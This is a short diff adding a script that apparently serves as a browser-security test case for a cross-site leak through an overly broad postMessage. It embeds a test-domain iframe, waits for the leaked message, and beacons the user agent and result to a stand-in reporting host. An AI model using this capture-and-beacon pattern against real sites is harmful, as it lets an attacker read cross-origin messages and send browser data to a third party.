@@ -1,0 +1,27 @@
+<script>
+    var messageReceived = false;
+    window.onload = function () {
+        window.addEventListener("message", function (e) {
+            console.log("Message received");
+            console.log(e);
+            if (e.data === "This is an overly broad postMessage") {
+                messageReceived = true;
+            }
+        });
+        var iframe = document.createElement('iframe');
+        document.body.appendChild(iframe);
+        iframe.src = 'https://leak.test/custom/case18/main/';
+
+        function report() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", "https://re.port/case18.json/" + btoa(JSON.stringify({
+                "user-agent": navigator.userAgent,
+                "message_received": messageReceived,
+                "xsleak_reproduced": messageReceived
+            })));
+            xhr.send();
+        }
+
+        setTimeout(report, 2000);
+    };
+</script>
